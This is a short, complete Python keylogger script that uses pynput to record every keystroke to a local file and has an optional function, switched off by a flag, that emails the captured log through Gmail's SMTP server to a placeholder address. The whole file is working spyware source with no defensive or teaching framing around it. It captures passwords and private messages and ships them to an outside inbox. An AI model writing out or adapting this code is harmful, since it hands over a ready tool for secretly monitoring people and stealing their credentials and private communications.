from pynput import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText

LOG_FILE = "keylog.txt"
SEND_EMAIL = False  # Set to True to enable emailing

EMAIL_ADDRESS = "youremail@example.com"
EMAIL_PASSWORD = "yourpassword"
SEND_TO = "destination@example.com"

# Save keystrokes to file
def write_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{key} ")

# Optional: send email with logs
def send_email():
    with open(LOG_FILE, "r") as f:
        log_data = f.read()

    msg = MIMEText(log_data)
    msg["Subject"] = "Keylogger Report"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = SEND_TO

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Log emailed successfully.")
    except Exception as e:
        print(f"Email failed: {e}")

# Key press event
def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        write_log(f"[{key}]")

# Key release event (stops on ESC)
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        if SEND_EMAIL:
            send_email()
        return False

# Start the keylogger
def start_keylogger():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
